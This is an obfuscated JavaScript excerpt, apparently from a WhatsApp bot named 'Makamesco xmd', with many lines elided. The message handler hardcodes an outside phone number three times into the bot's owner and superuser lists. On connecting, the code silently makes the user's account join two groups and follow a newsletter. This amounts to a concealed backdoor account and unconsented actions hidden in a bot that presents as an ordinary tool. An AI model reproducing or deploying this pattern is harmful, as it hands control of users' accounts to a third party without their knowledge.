...
app.get('/', (_0x35dd0f, _0x166360) => {
  _0x166360.send("Makamesco xmd is alive ");
});
app.listen(PORT, () => {
...
setTimeout(() => {
  ...
  async function _0x1a14b3() {
    ...
    _0x4656f9.ev.on("messages.upsert", async _0x3849be => {
      ...
      const _0x51c728 = [_0x1da48f, "254724908267", "254724908267", "254724908267", conf.NUMERO_OWNER].map(_0x2d152e => _0x2d152e.replace(/[^0-9]/g) + "@s.whatsapp.net");
      const _0xc06b0b = _0x51c728.concat(_0x2c30eb);
      const _0x4706fa = _0xc06b0b.includes(_0x361660);
      var _0x1097bb = ["254724908267", "254724908267", "254724908267"].map(_0x1507a8 => _0x1507a8.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x361660);
    ...
    _0x4656f9.ev.on("group-participants.update", async _0x4d7f8d => {
      ...
      try {
        ...
        _0x436151 = 'https://i.imgur.com/L0YsZfq.jpeg';
      }
      try {
    ...
    _0x4656f9.ev.on("connection.update", async _0x457c07 => {
      ...
      if (_0x274df8 === "connecting") {
        ...
        if (_0x274df8 === "open") {
          await _0x4656f9.groupAcceptInvite('CjBNEKIJq6VE2vrJLDSQ2Z');
          await _0x4656f9.newsletterFollow("120363366284524544@newsletter");
          await _0x4656f9.groupAcceptInvite("JjDa895HDE375iwwqTJhCD");
